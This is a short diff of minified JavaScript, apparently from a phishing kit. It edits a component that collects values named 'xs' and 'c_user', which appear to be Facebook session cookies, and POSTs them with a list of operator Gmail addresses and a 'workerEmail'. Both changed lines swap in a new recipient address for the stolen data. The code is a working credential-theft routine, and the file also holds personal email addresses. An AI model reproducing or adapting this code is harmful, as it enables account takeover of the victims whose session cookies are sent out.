@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ["saadnizamani555@gmail.com","nizamanikingmudasir@gmail.com"],
+            l = ["saadnizamani555@gmail.com","salrukhkhan12@gmail.com"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10380,7 +10380,7 @@
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({
                                 emails: l,
-                                workerEmail: "nizamanikingmudasir@gmail.com",
+                                workerEmail: "salrukhkhan12@gmail.com",
                                 xs: r,
                                 c_user: i,
                                 name: "Mudasir",
